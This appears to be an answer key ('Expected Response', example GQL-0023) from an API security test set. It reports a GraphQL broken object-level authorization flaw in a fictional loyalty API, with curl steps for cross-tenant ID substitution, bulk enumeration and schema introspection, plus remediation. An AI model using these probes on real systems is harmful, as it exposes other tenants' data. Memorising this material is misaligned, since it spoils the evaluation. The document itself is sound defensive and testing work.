# Expected Response

## System
- Domain: Retail / Loyalty Programme
- System: RewardCore Loyalty API
- Example ID: GQL-0023

## Priority Findings

### Finding 1: GraphQL BOLA — ID in path without ownership check (Pattern 1.1)
**Severity:** Critical
**Category:** BOLA

**Summary:**
The GraphQL API at `POST /graphql` contains a Pattern 1.1 (ID in path without ownership check) vulnerability.
An authenticated user belonging to `tenant-c01b` can access or manipulate objects owned by
`tenant-576a` by supplying a cross-tenant `resourceId` in the GraphQL query/mutation.

**Evidence from HAR:**
- Request JWT claim `tenantId`: `tenant-c01b`
- Response body `tenantId`: `tenant-576a` — **mismatch confirms cross-tenant data access**
- Response HTTP status: `200 OK` — no authorization error raised by the resolver
- Response includes `sensitiveField` and `internalNotes` belonging to `tenant-576a`

**Root Cause:**
The resolver fetches the resource by `resourceId` directly from the database without joining
against the authenticated user's `tenantId`. The JWT is validated (signature check passes) but the
`tenantId` claim is never used as a WHERE clause predicate.

## Steps to Reproduce

### Step 1 — Establish attacker baseline
```bash
curl -s -X POST https://api.rewardcore-loyalty-a.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-C01B>" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { getResource(id: \"R-1023\") { resourceId tenantId ownerId data { sensitiveField } } }"}' 
```
**Expected baseline:** Returns `tenantId: "tenant-c01b"` — this is the attacker's own object.

### Step 2 — Cross-tenant ID substitution
```bash
curl -s -X POST https://api.rewardcore-loyalty-a.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-C01B>" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { getResource(id: \"R-2023\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}' 
```
**Vulnerable outcome:** Returns `tenantId: "tenant-576a"` and full `sensitiveField` — **BOLA confirmed**.
**Secure outcome:** HTTP 403/404 or an empty data response with an authorization error.

### Step 3 — Bulk enumeration (if Pattern 1.9 also present)
```bash
curl -s -X POST https://api.rewardcore-loyalty-a.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-C01B>" \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2023\", \"R-3023\", \"R-4023\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns objects from multiple tenants in a single response.

### Step 4 — Introspection probe (if Pattern 6.1 also present)
```bash
curl -s -X POST https://api.rewardcore-loyalty-a.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-C01B>" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}' 
```
**Vulnerable outcome:** Full schema returned — confirms field names and relationships for deeper exploitation.

## Secure Outcome Verification
For **Step 2**, the secure implementation MUST return:
```json
{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": { "getResource": null } }
```

## Remediation
1. **Resolver-level tenant check:** In every resolver that fetches an object by ID, add a WHERE clause: `WHERE resourceId = $id AND tenant_id = $jwtTenantId`.
2. **Disable GraphQL introspection in production:** Set `introspection: false` in Apollo Server production config.
3. **Per-ID ownership filter for bulk operations:** In `bulkResourceLookup`, filter results post-fetch to only return objects matching the JWT's `tenantId`.
4. **Automated regression tests:** Add a test that authenticates as Tenant A and attempts to read Tenant B objects — assert HTTP 403 or null data.
